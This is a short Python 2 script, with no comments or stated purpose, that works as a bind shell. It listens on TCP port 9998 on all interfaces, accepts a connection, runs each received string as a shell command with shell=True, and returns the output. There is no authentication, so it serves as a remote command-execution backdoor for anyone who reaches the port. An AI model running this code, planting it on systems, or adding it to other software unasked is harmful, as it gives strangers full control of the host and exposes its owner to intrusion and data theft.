#!/usr/bin/env python

import socket
from subprocess import Popen, PIPE

HOST = ''
PORT = 9998
s = socket.socket()
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()
print conn
print addr
while True:
    cmd = conn.recv(1024)
    if not cmd: break
    p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
    stdout, stderr = p.communicate()
    if stdout:
        conn.sendall(stdout),
    else:
        conn.sendall(stderr),
conn.close()
